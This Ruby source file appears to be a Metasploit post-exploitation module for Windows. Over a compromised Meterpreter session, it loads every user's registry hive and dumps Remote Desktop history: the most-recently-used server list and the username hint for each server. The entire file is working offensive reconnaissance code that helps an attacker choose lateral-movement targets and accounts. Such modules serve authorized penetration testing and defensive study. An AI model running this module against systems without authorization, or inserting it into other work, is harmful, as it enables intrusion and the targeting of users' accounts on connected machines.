# post/windows/gather/enum_termserv.rb

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'rex'
require 'msf/core/post/windows/registry'
require 'msf/core/post/windows/user_profiles'
require 'msf/core/auxiliary/report'


class Metasploit3 < Msf::Post

  include Msf::Post::Windows::Registry
  include Msf::Auxiliary::Report
  include Msf::Post::Windows::UserProfiles

  def initialize(info={})
    super( update_info( info,
      'Name'          => 'Windows Gather Terminal Server Client Connection Information Dumper',
      'Description'   => %q{
        This module dumps MRU and connection data for RDP sessions
      },
      'License'       => MSF_LICENSE,
      'Author'        => [ 'mubix' ],
      'Platform'      => [ 'win' ],
      'SessionTypes'  => [ 'meterpreter' ]
    ))
  end

  def run
    userhives = load_missing_hives()
    userhives.each do |hive|
      next if hive['HKU'] == nil
      print_status("Doing enumeration for #{hive['SID']}")
      root_key, base_key = session.sys.registry.splitkey("#{hive['HKU']}\\Software\\Microsoft\\Terminal\ Server\ Client")
      begin
        tmpkey = session.sys.registry.open_key(root_key, base_key, KEY_READ)
        tmpkey_values = tmpkey.enum_key
        if tmpkey_values.include?('Default')
          defaultkey = session.sys.registry.open_key(root_key, base_key + '\\Default', KEY_READ)
          print_good('Systems connected to:')
          (defaultkey.enum_value).each do |x|
            if x.name =~ /^MRU/
              print_good("--> #{defaultkey.query_value(x.name).data}")
            end
          end
        end

        if tmpkey_values.include?('Servers')
          serverskey = session.sys.registry.open_key(root_key, base_key + '\\Servers', KEY_READ)
          serverskey_keys = serverskey.enum_key
          print_good('Server list and user hints:')
          serverskey_keys.each do |hostval|
            hostvalkey = session.sys.registry.open_key(root_key, base_key + '\\Servers\\' + hostval, KEY_READ)
            print_good("#{hostval} is connected to as #{hostvalkey.query_value('UsernameHint').data}")
          end
        end
      rescue Rex::Post::Meterpreter::RequestError => e
      end
    end
    unload_our_hives(userhives)
  end
end
